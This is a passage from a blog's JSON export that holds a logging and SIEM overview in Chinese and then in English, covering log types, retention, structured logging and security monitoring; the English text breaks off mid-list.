模式变更（CREATE、ALTER、DROP） 检查点和恢复信息 关键功能： 崩溃恢复：在系统故障后重放已提交的事务 时间点恢复：将数据库还原到特定时刻 复制：将变更传播到副本数据库 审计轨迹：追踪所有数据修改 特定数据库示例： MySQL Binary Log：复制和时间点恢复 PostgreSQL WAL：预写式日志以确保持久性 Oracle Redo Log：事务恢复和复制 MongoDB Oplog：副本集的操作日志 SIEM：安全的中枢神经系统 安全信息与事件管理（SIEM）系统代表日志分析的巅峰，关联来自多个来源的数据以检测威胁、调查事件并确保合规性。 什么是 SIEM？ SIEM 平台聚合来自整个基础设施的日志——防火墙、服务器、应用程序、数据库、云服务——并应用高级分析来实时检测安全威胁。 核心能力： 日志聚合：从不同格式的多样来源收集日志，并将它们标准化为通用模式以进行分析。 实时关联：应用规则来检测多个日志来源的模式。例如，关联访问日志中的失败登录尝试与防火墙阻止和 IDS 警报，以识别协同攻击。 威胁检测：使用签名、行为分析和机器学习来识别已知和未知的威胁。 事件调查：提供搜索和可视化工具来调查安全事件、追踪攻击路径并理解影响。 合规报告：生成报告，证明符合 PCI DSS、HIPAA、SOX 和 GDPR 等法规。 警报和响应：在检测到威胁时触发警报，并与安全编排工具集成以进行自动响应。 SIEM 如何运作 graph TB A([🖥️ 服务器]) --> E([📥 SIEM 平台]) B([🔥 防火墙]) --> E C([💻 应用程序]) --> E D([☁️ 云服务]) --> E E --> F([🔄 标准化与丰富化]) F --> G([🧠 关联引擎]) G --> H{🚨 检测到威胁？} H -->|是| I([📢 警报安全团队]) H -->|否| J([📊 存储以供分析]) I --> K([🔍 调查与响应]) style E fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px style I fill:#ffebee,stroke:#c62828,stroke-width:2px style K fill:#e8f5e9,stroke:#388e3c,stroke-width:2px SIEM 使用案例 检测暴力攻击：关联来自同一 IP 的多次失败登录尝试跨不同系统，当超过阈值时触发警报。 识别内部威胁：检测异常的数据访问模式，例如员工在正常工作时间外下载大量客户数据。 合规监控：持续监控策略违规，并生成审计报告证明符合法规要求。 事件响应：当发生漏洞时，快速搜索所有日志以理解攻击时间线、受影响的系统和数据暴露。 威胁狩猎：主动搜索历史日志中的入侵指标（IOC），以识别先前未检测到的漏洞。 热门 SIEM 平台 Splunk：市场领导者，具有强大的搜索能力和广泛的集成。以灵活性著称，但大规模使用可能昂贵。 IBM QRadar：强大的关联引擎和威胁情报集成。在企业环境中很受欢迎。 ArcSight：长期建立的平台，具有强健的合规功能。对大型组织来说复杂但强大。 Elastic Security（ELK Stack）：开源选项，结合 Elasticsearch、Logstash 和 Kibana 与安全分析。对具有技术专业知识的组织来说具成本效益。 Azure Sentinel：云原生 SIEM，具有 AI 驱动的威胁检测。与 Microsoft 生态系统无缝集成。 AWS Security Hub：聚合来自 AWS 服务和第三方工具的安全发现。最适合以 AWS 为中心的环境。 📝 SIEM vs 日志管理日志管理专注于收集、存储和搜索日志以进行故障排除和分析。 SIEM 增加了安全特定能力：威胁检测、关联、合规报告和事件响应。 将日志管理视为基础，SIEM 视为建立在其上的安全情报层。 构建全面的日志策略 有效的日志记录不是收集所有东西——而是收集正确的东西并知道如何使用它们。以下是如何构建平衡可见性、成本和合规性的日志策略。 定义您的日志需求 识别利益相关者：不同团队需要不同的日志： 开发者：用于调试的应用程序日志 运维人员：用于故障排除的系统和性能日志 安全人员：用于威胁检测的安全和审计日志 合规人员：用于法规要求的审计日志 业务人员：用于分析的事务日志 确定保留期限：平衡存储成本与合规和运营需求： 热存储（快速、昂贵）：用于主动故障排除的最近日志（7-30 天） 温存储（中等）：用于调查的历史日志（30-90 天） 冷存储（慢速、便宜）：用于合规的归档日志（1-7 年） 实施结构化日志 在所有系统中使用一致、可解析的格式： JSON 格式：机器可读且人类友好 &#123; &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;message&quot;: &quot;Payment failed&quot;, &quot;context&quot;: &#123; &quot;userId&quot;: &quot;user_789&quot;, &quot;orderId&quot;: &quot;order_456&quot;, &quot;amount&quot;: 99.99 &#125; &#125; 包含必要字段： 时间戳：ISO 8601 格式含时区 严重性：跨服务的一致级别 服务/组件：哪个系统生成了日志 关联 ID：追踪跨服务的请求 上下文：相关的业务和技术细节 集中日志收集 不要让日志散落在各个服务器上： 日志传送：使用代理（Filebeat、Fluentd、Logstash）将日志转发到中央存储。 直接集成：配置应用程序通过 API 直接将日志发送到集中式平台。 云原生选项：对云工作负载使用云提供商的日志服务（CloudWatch、Stackdriver、Azure Monitor）。 实施日志分析 实时监控：为关键事件设置仪表板和警报： 错误率激增 安全异常 性能下降 系统故障 定期审查：安排定期日志审查以识别趋势和问题： 每周：审查错误模式和性能趋势 每月：分析安全事件和合规状态 每季：评估日志策略有效性 自动化分析：使用机器学习来检测人类可能错过的异常和模式。 保护您的日志 加密：加密传输中和静态的日志以保护敏感信息。 访问控制：根据角色和需知原则限制日志访问。 完整性保护：使用加密哈希或区块链技术来检测篡改。 独立存储：将安全日志存储在独立系统上，以防止攻击者掩盖其踪迹。 ⚠️ 常见日志错误 记录太多：过度日志记录会产生噪音并增加成本 记录太少：遗漏关键事件使故障排除变得不可能 记录敏感数据：个人识别信息、密码和机密永远不应被记录 忽略日志轮转：未轮转的日志可能填满磁盘并使系统崩溃 没有集中化：分散的日志使关联和分析变得困难 忘记合规性：不充分的保留可能导致法规处罚 日志分析技术 收集日志只是战斗的一半——提取洞察需要有效的分析技术。 搜索和过滤 基本搜索：使用关键字、错误代码或标识符查找特定事件。 高级查询：使用查询语言（Lucene、KQL、SPL）进行复杂搜索： 查找过去一小时内来自特定服务的所有错误 识别响应时间超过 5 秒的请求 定位来自特定 IP 范围的所有失败登录尝试 聚合和统计 计数和分组：聚合日志以识别模式： 按类型计算错误 按端点分组请求 计算平均响应时间 时间序列分析：追踪随时间变化的指标以识别趋势： 过去一周错误率增加 按一天中的小时划分的流量模式 系统负载的季节性变化 关联 跨来源关联：连接不同日志来源的事件： 将应用程序错误链接到基础设施问题 关联多个系统的安全事件 追踪跨微服务的用户旅程 时间关联：识别在时间上一起发生的事件： 失败登录后成功登录（凭证填充） 数据库减速与批处理作业执行同时发生 部署期间的网络延迟激增 可视化 仪表板：创建系统健康和关键指标的实时视图。 图表和图形：可视化趋势、分布和异常： 时间序列数据的折线图 比较的柱状图 模式检测的热图 分布分析的饼图 警报：根据阈值、异常或特定模式配置警报。 graph LR A([📊 原始日志]) --> B([🔍 搜索与过滤]) B --> C([📈 聚合与分析]) C --> D([🔗 关联事件]) D --> E([📉 可视化与警报]) E --> F([💡 洞察与行动]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 日志的未来：AI 与自动化 日志领域持续演进，人工智能和自动化正在改变我们收集、分析和处理日志数据的方式。 AI 驱动的日志分析 异常检测：机器学习模型在没有预定义规则的情况下识别异常模式： 检测没有已知签名的零日攻击 在影响用户之前识别性能下降 根据行为变化发现内部威胁 自动化根本原因分析：AI 关联日志、指标和追踪以自动识别问题的根本原因，将平均解决时间（MTTR）从数小时缩短到数分钟。 预测分析：分析历史模式以预测未来问题： 根据流量趋势预测容量需求 在硬件故障发生前预测 根据新兴模式预测安全威胁 可观测性平台 现代可观测性平台将日志与指标和分布式追踪集成，提供完整的系统可见性： 统一视图：在单一界面中查看日志、指标和追踪，使理解系统行为变得更容易。 自动关联：平台自动链接相关的日志、指标和追踪，消除手动关联工作。 上下文感知分析：AI 理解服务之间的关系，自动识别依赖关系和影响。 自动化响应 自我修复系统：自动响应检测到的问题： 重新启动失败的服务 根据负载扩展资源 阻止恶意 IP 地址 回滚有问题的部署 安全编排：将 SIEM 与安全编排、自动化和响应（SOAR）平台集成，以自动遏制威胁。 🔮 新兴趋势 基于 eBPF 的日志记录：内核级别的可观测性，开销最小 OpenTelemetry：日志、指标和追踪的供应商中立标准 边缘日志记录：在边缘处理日志以减少带宽和延迟 隐私保护日志记录：在保护用户隐私的同时记录有用信息的技术 基于区块链的审计日志：不可变、防篡改的审计轨迹 入门：实用步骤 准备好改善您的日志策略了吗？这里有一个实用的路线图： 步骤 1：审计您当前的日志记录 清点：列出所有生成日志的系统、应用程序和服务。 评估覆盖范围：识别未记录关键事件的缺口。 审查保留期：确保保留期限符合合规和运营需求。 评估成本：理解当前的日志成本并识别优化机会。 步骤 2：实施结构化日志 选择格式：标准化使用 JSON 或其他结构化格式。 定义模式：在服务之间创建一致的字段名称和数据类型。 添加上下文：包含关联 ID、用户 ID 和其他上下文信息。 更新应用程序：逐步从非结构化迁移到结构化日志。 步骤 3：集中日志收集 选择平台：根据您的需求和预算选择日志管理或 SIEM 平台。 部署代理：在所有系统上安装日志传送代理。 配置转发：从应用程序和服务配置日志转发。 测试和验证：确保日志正确流动并被正确解析。 步骤 4：创建仪表板和警报 识别关键指标：确定哪些指标对您的系统最重要。 构建仪表板：创建系统健康和性能的实时视图。 配置警报：为关键事件和异常设置通知。 建立操作手册：记录常见警报的响应程序。 步骤 5：培训您的团队 开发者培训：教导开发者有效记录什么和如何记录。 运维培训：培训运维团队进行日志分析和故障排除。 安全培训：确保安全团队能够使用 SIEM 进行威胁检测和调查。 定期审查：安排定期审查以评估日志有效性并识别改进。 🎯 快速成功：从小处着手不要试图一次实施所有东西。从以下开始： 第 1 周：在一个关键服务中实施结构化日志 第 2 周：为该服务设置集中收集 第 3 周：创建基本仪表板和一个关键警报 第 4 周：审查有效性并扩展到另一个服务 这种渐进式方法建立动力并快速展示价值。 结论：日志作为战略资产 日志不仅仅是调试工具——它们是提供可见性、安全性、合规性和业务洞察的战略资产。从帮助开发者排除问题的简单应用程序日志，到检测网络威胁的复杂 SIEM 系统，日志构成了现代系统可观测性的基础。 有效日志记录的关键不是收集所有东西——而是收集正确的东西、适当地存储它们，并智能地分析它们。随着系统变得更复杂，威胁变得更复杂，从日志中提取洞察的能力变得越来越关键。 日志的未来在于自动化和智能。AI 驱动的分析将检测人类会错过的异常，自动化响应系统将在几秒钟内遏制威胁，可观测性平台将提供前所未有的系统行为可见性。今天投资于强健日志策略的组织，将更有能力在明天安全、高效且合规地运作。 您的日志已经在告诉您关于系统的故事——您在聆听吗？ 💭 最后的想法「我们信任上帝。其他所有人都必须带来数据。」—— W. Edwards Deming 日志就是您的数据。它们告诉您系统中真正发生的事情，穿透假设和猜测以揭示现实。问题不是是否要投资于日志记录——而是您能多快将日志转化为可行的洞察。 其他资源 日志框架： Log4j - Java 日志框架 Winston - Node.js 日志库 Python logging - 内置 Python 日志 Serilog - .NET 结构化日志 日志管理平台： ELK Stack - Elasticsearch、Logstash、Kibana Splunk - 企业日志管理和 SIEM Datadog - 云监控和日志管理 Graylog - 开源日志管理 SIEM 解决方案： IBM QRadar - 企业 SIEM Azure Sentinel - 云原生 SIEM AWS Security Hub - AWS 安全发现聚合 标准和最佳实践： RFC 5424 - Syslog 协议 OpenTelemetry - 可观测性框架 OWASP Logging Cheat Sheet - 安全日志指南","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Logging","slug":"Logging","permalink":"https://neo01.com/tags/Logging/"},{"name":"SIEM","slug":"SIEM","permalink":"https://neo01.com/tags/SIEM/"}],"lang":"zh-CN"},{"title":"Understanding Logs: The Silent Guardians of Your Systems","slug":"2023/02/Understanding_Logs_The_Silent_Guardians_of_Your_Systems","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2023/02/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","permalink":"https://neo01.com/2023/02/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","excerpt":"From application logs to SIEM - discover how different types of logs work together to keep your systems secure, performant, and compliant. Learn when to use each type and how they form a complete observability strategy.","text":"Remember the last time your application crashed in production? You probably did what every developer does: frantically searched through log files, trying to piece together what went wrong. Maybe you found a cryptic error message buried among thousands of INFO statements, or worse - discovered that the critical error wasn’t logged at all. Logs are the silent guardians of our systems, constantly recording what’s happening behind the scenes. But not all logs are created equal. From simple application logs that track code execution to sophisticated Security Information and Event Management (SIEM) systems that detect cyber threats, the logging landscape is vast and often misunderstood. What started as simple print statements for debugging has evolved into a complex ecosystem of specialized logging systems, each serving distinct purposes. Today’s modern infrastructure generates millions of log entries per second, and understanding which logs to collect, how to store them, and when to analyze them can mean the difference between catching a security breach in minutes versus discovering it months later. 💡 What Are Logs?Logs are time-stamped records of events that occur within systems, applications, or networks. They capture everything from routine operations to critical errors, providing an audit trail for troubleshooting, security analysis, compliance, and performance optimization. The Evolution of Logging: From Print Statements to Observability Logging began simply enough. In the early days of computing, developers used print statements to understand what their code was doing. If something went wrong, you’d add more print statements, recompile, and run again. This was the debug era - crude but effective for small programs. As systems grew more complex, structured logging emerged. Instead of random print statements, developers adopted logging frameworks that provided severity levels (DEBUG, INFO, WARN, ERROR), timestamps, and consistent formatting. This marked the structured logging era, where logs became parseable and searchable rather than just human-readable text. Then came distributed systems and microservices. A single user request might touch dozens of services, each generating its own logs. Correlating these logs became critical, leading to the centralized logging era. Tools like ELK Stack (Elasticsearch, Logstash, Kibana) and Splunk emerged to aggregate, search, and visualize logs from multiple sources. Today, we’re in the observability era. Logs are just one pillar of observability, working alongside metrics and traces to provide complete system visibility. Modern platforms correlate logs with performance metrics, distributed traces, and security events, giving teams unprecedented insight into system behavior. timeline title Evolution of Logging 1960s-1980s : Debug Era : Print statements and console output : Manual log review 1990s-2000s : Structured Logging Era : Logging frameworks (log4j, syslog) : Severity levels and formatting 2000s-2010s : Centralized Logging Era : Log aggregation platforms : ELK Stack, Splunk 2010s-Present : Observability Era : Logs + Metrics + Traces : AI-powered analysis : Real-time correlation Types of Logs: A Comprehensive Taxonomy Understanding the different types of logs and their purposes is essential for building robust systems. Let’s explore the major categories and when to use each. Application Logs Application logs record events within your software code - function calls, variable values, business logic execution, and errors. These are the logs developers interact with most frequently. What They Capture: Function entry and exit points Variable values at critical moments Business logic decisions (e.g., “User eligible for discount”) Exceptions and error stack traces Performance timing for operations Common Severity Levels: TRACE: Extremely detailed information, typically only enabled during development DEBUG: Detailed information useful for diagnosing problems INFO: General informational messages about application flow WARN: Potentially harmful situations that aren’t errors yet ERROR: Error events that might still allow the application to continue FATAL: Severe errors that cause application termination Best Practices: Use structured logging formats (JSON) for easier parsing Include correlation IDs to trace requests across services Avoid logging sensitive data (passwords, credit cards, PII) Set appropriate log levels for different environments (DEBUG in dev, INFO in production) Implement log rotation to prevent disk space exhaustion 🎬 Real-World Application Log{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;correlationId&quot;: &quot;abc-123-def-456&quot;, &quot;message&quot;: &quot;Payment processing failed&quot;, &quot;error&quot;: &quot;Gateway timeout&quot;, &quot;userId&quot;: &quot;user_789&quot;, &quot;amount&quot;: 99.99, &quot;stackTrace&quot;: &quot;...&quot; &#125; This structured format makes it easy to search for all errors related to a specific user, correlation ID, or error type. System Logs System logs capture operating system and infrastructure events - server startups, hardware failures, kernel messages, and system service status changes. What They Capture: Boot and shutdown events Hardware errors (disk failures, memory issues) Kernel messages and driver events System service status (started, stopped, failed) Resource exhaustion warnings Common System Log Types: syslog: Unix/Linux standard logging protocol Windows Event Logs: Windows system event recording journald: Modern Linux logging system (systemd) dmesg: Kernel ring buffer messages Why They Matter: System logs often provide early warning signs of hardware failures, security breaches, or configuration issues. A sudden spike in disk errors might predict imminent drive failure, while unusual authentication attempts could indicate a brute-force attack. Security Logs Security logs track authentication, authorization, and security-relevant events. These are critical for detecting breaches, investigating incidents, and meeting compliance requirements. What They Capture: Login attempts (successful and failed) Permission changes and privilege escalations Firewall allow/deny decisions Intrusion detection system (IDS) alerts Data access and modification events Security policy violations Key Security Log Sources: Authentication logs: Who logged in, when, and from where Firewall logs: Network traffic allowed or blocked IDS/IPS logs: Detected intrusion attempts Antivirus logs: Malware detection and quarantine events VPN logs: Remote access connections Database audit logs: Sensitive data access Compliance Requirements: Many regulations mandate security log retention: PCI DSS: 90 days online, 1 year archived (payment card data) HIPAA: 6 years (healthcare data) SOX: 7 years (financial records) GDPR: Varies by purpose and legal basis ⚠️ Security Log Best Practices Protect log integrity: Store logs on separate systems to prevent attackers from covering their tracks Monitor in real-time: Don't wait for monthly reviews to detect breaches Correlate events: A single failed login is normal; 1000 in a minute is an attack Encrypt sensitive logs: Logs may contain sensitive information Implement tamper detection: Use cryptographic hashing to detect log modifications Audit Logs Audit logs provide a detailed, immutable record of who did what, when, and where. Unlike general application logs, audit logs are specifically designed for compliance, forensics, and accountability. What They Capture: User actions (create, read, update, delete) Administrative changes (configuration, permissions) Data access and modifications System configuration changes Policy violations Key Characteristics: Immutable: Once written, audit logs should never be modified or deleted Comprehensive: Capture all relevant context (who, what, when, where, why) Tamper-evident: Use cryptographic techniques to detect modifications Long retention: Often kept for years to meet compliance requirements Audit Log vs Application Log: Aspect Application Log Audit Log Purpose Debugging, troubleshooting Compliance, accountability Audience Developers, operations Auditors, legal, security Retention Days to weeks Months to years Mutability Can be rotated/deleted Immutable Detail Level Technical details Business actions 🎯 Audit Log Example{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;actor&quot;: &#123; &quot;userId&quot;: &quot;admin_123&quot;, &quot;ipAddress&quot;: &quot;192.168.1.100&quot;, &quot;userAgent&quot;: &quot;Mozilla&#x2F;5.0...&quot; &#125;, &quot;action&quot;: &quot;DELETE&quot;, &quot;resource&quot;: &#123; &quot;type&quot;: &quot;customer_record&quot;, &quot;id&quot;: &quot;cust_456&quot;, &quot;name&quot;: &quot;John Doe&quot; &#125;, &quot;result&quot;: &quot;SUCCESS&quot;, &quot;reason&quot;: &quot;Customer requested data deletion (GDPR)&quot;, &quot;signature&quot;: &quot;a3f5b8c9d2e1...&quot; &#125; Access Logs Access logs record requests to web servers, APIs, and other network services. They’re essential for understanding traffic patterns, detecting attacks, and troubleshooting connectivity issues. What They Capture: HTTP requests (method, URL, status code) Client information (IP address, user agent) Response size and timing Referrer and authentication details Common Formats: Apache Combined Log Format: Standard web server format NGINX Access Log: Similar to Apache with customization options AWS CloudFront Logs: CDN access logs API Gateway Logs: API request/response details Use Cases: Traffic analysis: Understand user behavior and popular content Performance monitoring: Identify slow endpoints Security detection: Spot SQL injection, XSS attempts, bot traffic Capacity planning: Predict infrastructure needs based on traffic trends Performance Logs Performance logs track system and application performance metrics - response times, resource utilization, throughput, and bottlenecks. What They Capture: Request/response latency Database query execution time CPU, memory, disk, network utilization Thread pool and connection pool metrics Cache hit/miss rates Garbage collection events Why They Matter: Performance logs help identify bottlenecks before they impact users. A gradual increase in database query time might indicate missing indexes or growing data volumes requiring optimization. graph TB A([👤 User Request]) --> B([🌐 Load BalancerAccess Log]) B --> C([🖥️ Web ServerApplication Log]) C --> D([💾 DatabaseQuery Log]) D --> C C --> E([📊 Performance LogResponse Time: 250ms]) C --> B B --> A F([🔍 Monitoring System]) -.Collects.-> B F -.Collects.-> C F -.Collects.-> D F -.Collects.-> E style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Transaction Logs Transaction logs record database operations, ensuring data integrity and enabling recovery after failures. These are critical for maintaining ACID properties in databases. What They Capture: Database transactions (BEGIN, COMMIT, ROLLBACK) Data modifications (INSERT, UPDATE, DELETE) Schema changes (CREATE, ALTER, DROP) Checkpoint and recovery information Key Functions: Crash recovery: Replay committed transactions after system failure Point-in-time recovery: Restore database to specific moment Replication: Propagate changes to replica databases Audit trail: Track all data modifications Database-Specific Examples: MySQL Binary Log: Replication and point-in-time recovery PostgreSQL WAL: Write-Ahead Logging for durability Oracle Redo Log: Transaction recovery and replication MongoDB Oplog: Operations log for replica sets SIEM: The Central Nervous System of Security Security Information and Event Management (SIEM) systems represent the pinnacle of log analysis, correlating data from multiple sources to detect threats, investigate incidents, and ensure compliance. What is SIEM? SIEM platforms aggregate logs from across your infrastructure - firewalls, servers, applications, databases, cloud services - and apply advanced analytics to detect security threats in real-time. Core Capabilities: Log Aggregation: Collect logs from diverse sources in different formats and normalize them into a common schema for analysis. Real-Time Correlation: Apply rules to detect patterns across multiple log sources. For example, correlating failed login attempts from access logs with firewall blocks and IDS alerts to identify coordinated attacks. Threat Detection: Use signatures, behavioral analysis, and machine learning to identify known and unknown threats. Incident Investigation: Provide search and visualization tools to investigate security incidents, trace attack paths, and understand impact. Compliance Reporting: Generate reports demonstrating compliance with regulations like PCI DSS, HIPAA, SOX, and GDPR. Alerting and Response: Trigger alerts when threats are detected and integrate with security orchestration tools for automated response. How SIEM Works graph TB A([🖥️ Servers]) --> E([📥 SIEM Platform]) B([🔥 Firewalls]) --> E C([💻 Applications]) --> E D([☁️ Cloud Services]) --> E E --> F([🔄 Normalization& Enrichment]) F --> G([🧠 CorrelationEngine]) G --> H{🚨 ThreatDetected?} H -->|Yes| I([📢 AlertSecurity Team]) H -->|No| J([📊 Store forAnalysis]) I --> K([🔍 Investigation& Response]) style E fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px style I fill:#ffebee,stroke:#c62828,stroke-width:2px style K fill:#e8f5e9,stroke:#388e3c,stroke-width:2px SIEM Use Cases Detecting Brute-Force Attacks: Correlate multiple failed login attempts from the same IP across different systems, triggering alerts when thresholds are exceeded. Identifying Insider Threats: Detect unusual data access patterns, such as an employee downloading large volumes of customer data outside normal working hours. Compliance Monitoring: Continuously monitor for policy violations and generate audit reports demonstrating compliance with regulatory requirements. Incident Response: When a breach occurs, quickly search across all logs to understand the attack timeline, affected systems, and data exposure. Threat Hunting: Proactively search for indicators of compromise (IOCs) across historical logs to identify previously undetected breaches. Popular SIEM Platforms Splunk: Market leader with powerful search capabilities and extensive integrations. Known for flexibility but can be expensive at scale. IBM QRadar: Strong correlation engine and threat intelligence integration. Popular in enterprise environments. ArcSight: Long-established platform with robust compliance features. Complex but powerful for large organizations. Elastic Security (ELK Stack): Open-source option combining Elasticsearch, Logstash, and Kibana with security analytics. Cost-effective for organizations with technical expertise. Azure Sentinel: Cloud-native SIEM with AI-powered threat detection. Integrates seamlessly with Microsoft ecosystem. AWS Security Hub: Aggregates security findings from AWS services and third-party tools. Best for AWS-centric environments. 📝 SIEM vs Log ManagementLog Management focuses on collecting, storing, and searching logs for troubleshooting and analysis. SIEM adds security-specific capabilities: threat detection, correlation, compliance reporting, and incident response. Think of log management as the foundation and SIEM as the security intelligence layer built on top. Building a Comprehensive Logging Strategy Effective logging isn’t about collecting everything - it’s about collecting the right things and knowing how to use them. Here’s how to build a logging strategy that balances visibility, cost, and compliance. Define Your Logging Requirements Identify Stakeholders: Different teams need different logs: Developers: Application logs for debugging Operations: System and performance logs for troubleshooting Security: Security and audit logs for threat detection Compliance: Audit logs for regulatory requirements Business: Transaction logs for analytics Determine Retention Periods: Balance storage costs against compliance and operational needs: Hot storage (fast, expensive): Recent logs for active troubleshooting (7-30 days) Warm storage (moderate): Historical logs for investigation (30-90 days) Cold storage (slow, cheap): Archived logs for compliance (1-7 years) Implement Structured Logging Use consistent, parseable formats across all systems: JSON Format: Machine-readable and human-friendly &#123; &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;message&quot;: &quot;Payment failed&quot;, &quot;context&quot;: &#123; &quot;userId&quot;: &quot;user_789&quot;, &quot;orderId&quot;: &quot;order_456&quot;, &quot;amount&quot;: 99.99 &#125; &#125; Include Essential Fields: Timestamp: ISO 8601 format with timezone Severity: Consistent levels across services Service/Component: Which system generated the log Correlation ID: Trace requests across services Context: Relevant business and technical details Centralize Log Collection Don’t leave logs scattered across individual servers: Log Shipping: Use agents (Filebeat, Fluentd, Logstash) to forward logs to central storage. Direct Integration: Configure applications to send logs directly to centralized platforms via APIs. Cloud-Native Options: Use cloud provider logging services (CloudWatch, Stackdriver, Azure Monitor) for cloud workloads. Implement Log Analysis Real-Time Monitoring: Set up dashboards and alerts for critical events: Error rate spikes Security anomalies Performance degradation System failures Periodic Review: Schedule regular log reviews to identify trends and issues: Weekly: Review error patterns and performance trends Monthly: Analyze security events and compliance status Quarterly: Assess logging strategy effectiveness Automated Analysis: Use machine learning to detect anomalies and patterns humans might miss. Secure Your Logs Encryption: Encrypt logs in transit and at rest to protect sensitive information. Access Control: Restrict log access based on role and need-to-know principles. Integrity Protection: Use cryptographic hashing or blockchain techniques to detect tampering. Separate Storage: Store security logs on separate systems to prevent attackers from covering their tracks. ⚠️ Common Logging Mistakes Logging too much: Excessive logging creates noise and increases costs Logging too little: Missing critical events makes troubleshooting impossible Logging sensitive data: PII, passwords, and secrets should never be logged Ignoring log rotation: Unrotated logs can fill disks and crash systems No centralization: Scattered logs make correlation and analysis difficult Forgetting compliance: Inadequate retention can result in regulatory penalties Log Analysis Techniques Collecting logs is only half the battle - extracting insights requires effective analysis techniques. Search and Filter Basic Search: Find specific events using keywords, error codes, or identifiers. Advanced Queries: Use query languages (Lucene, KQL, SPL) for complex searches: Find all errors from a specific service in the last hour Identify requests with response times over 5 seconds Locate all failed login attempts from a particular IP range Aggregation and Statistics Count and Group: Aggregate logs to identify patterns: Count errors by type Group requests by endpoint Calculate average response times Time-Series Analysis: Track metrics over time to identify trends: Error rate increasing over the past week Traffic patterns by hour of day Seasonal variations in system load Correlation Cross-Source Correlation: Connect events across different log sources: Link application errors to infrastructure issues Correlate security events across multiple systems Trace user journeys across microservices Temporal Correlation: Identify events that occur together in time: Failed login followed by successful login (credential stuffing) Database slowdown coinciding with batch job execution Network latency spike during deployment Visualization Dashboards: Create real-time views of system health and key metrics. Charts and Graphs: Visualize trends, distributions, and anomalies: Line charts for time-series data Bar charts for comparisons Heat maps for pattern detection Pie charts for distribution analysis Alerting: Configure alerts based on thresholds, anomalies, or specific patterns. graph LR A([📊 Raw Logs]) --> B([🔍 Search& Filter]) B --> C([📈 Aggregate& Analyze]) C --> D([🔗 CorrelateEvents]) D --> E([📉 Visualize& Alert]) E --> F([💡 Insights& Actions]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px The Future of Logging: AI and Automation The logging landscape continues to evolve, with artificial intelligence and automation transforming how we collect, analyze, and act on log data. AI-Powered Log Analysis Anomaly Detection: Machine learning models identify unusual patterns without predefined rules: Detect zero-day attacks with no known signatures Identify performance degradation before it impacts users Spot insider threats based on behavioral changes Automated Root Cause Analysis: AI correlates logs, metrics, and traces to automatically identify the root cause of issues, reducing mean time to resolution (MTTR) from hours to minutes. Predictive Analytics: Analyze historical patterns to predict future issues: Forecast capacity needs based on traffic trends Predict hardware failures before they occur Anticipate security threats based on emerging patterns Observability Platforms Modern observability platforms integrate logs with metrics and distributed traces, providing complete system visibility: Unified View: See logs, metrics, and traces in a single interface, making it easier to understand system behavior. Automatic Correlation: Platforms automatically link related logs, metrics, and traces, eliminating manual correlation work. Context-Aware Analysis: AI understands the relationships between services, automatically identifying dependencies and impact. Automated Response Self-Healing Systems: Automatically respond to detected issues: Restart failed services Scale resources based on load Block malicious IP addresses Rollback problematic deployments Security Orchestration: Integrate SIEM with security orchestration, automation, and response (SOAR) platforms to automatically contain threats. 🔮 Emerging Trends eBPF-based logging: Kernel-level observability with minimal overhead OpenTelemetry: Vendor-neutral standard for logs, metrics, and traces Edge logging: Processing logs at the edge to reduce bandwidth and latency Privacy-preserving logging: Techniques to log useful information while protecting user privacy Blockchain-based audit logs: Immutable, tamper-proof audit trails Getting Started: Practical Steps Ready to improve your logging strategy? Here’s a practical roadmap: Step 1: Audit Your Current Logging Inventory: List all systems, applications, and services that generate logs. Assess Coverage: Identify gaps where critical events aren’t being logged. Review Retention: Ensure retention periods meet compliance and operational needs. Evaluate Costs: Understand current logging costs and identify optimization opportunities. Step 2: Implement Structured Logging Choose a Format: Standardize on JSON or another structured format. Define Schema: Create consistent field names and data types across services. Add Context: Include correlation IDs, user IDs, and other contextual information. Update Applications: Migrate from unstructured to structured logging incrementally. Step 3: Centralize Log Collection Select a Platform: Choose a log management or SIEM platform based on your needs and budget. Deploy Agents: Install log shipping agents on all systems. Configure Forwarding: Set up log forwarding from applications and services. Test and Validate: Ensure logs are flowing correctly and being parsed properly. Step 4: Create Dashboards and Alerts Identify Key Metrics: Determine which metrics matter most for your systems. Build Dashboards: Create real-time views of system health and performance. Configure Alerts: Set up notifications for critical events and anomalies. Establish Runbooks: Document response procedures for common alerts. Step 5: Train Your Team Developer Training: Teach developers what and how to log effectively. Operations Training: Train ops teams on log analysis and troubleshooting. Security Training: Ensure security teams can use SIEM for threat detection and investigation. Regular Reviews: Schedule periodic reviews to assess logging effectiveness and identify improvements. 🎯 Quick Win: Start SmallDon't try to implement everything at once. Start with: Week 1: Implement structured logging in one critical service Week 2: Set up centralized collection for that service Week 3: Create a basic dashboard and one critical alert Week 4: 